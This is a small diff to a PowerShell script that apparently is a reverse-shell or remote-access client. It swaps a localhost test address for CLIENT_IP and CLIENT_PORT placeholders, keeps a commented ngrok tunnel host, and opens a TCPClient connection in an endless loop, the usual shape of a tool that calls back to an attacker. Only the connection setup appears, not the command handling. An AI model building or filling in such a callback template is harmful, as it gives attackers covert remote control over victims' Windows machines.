@@ -77,8 +77,8 @@ function main {
     # $ip_address = "5.tcp.eu.ngrok.io"
     # $port_number = 17776
     Add-Type -AssemblyName System.Windows.Forms
-    $ip_address = "localhost"
-    $port_number = 1234
+    $ip_address = "CLIENT_IP"
+    $port_number = CLIENT_PORT
     while ($true) {
         try {
             $client = New-Object System.Net.Sockets.TCPClient($ip_address,$port_number)
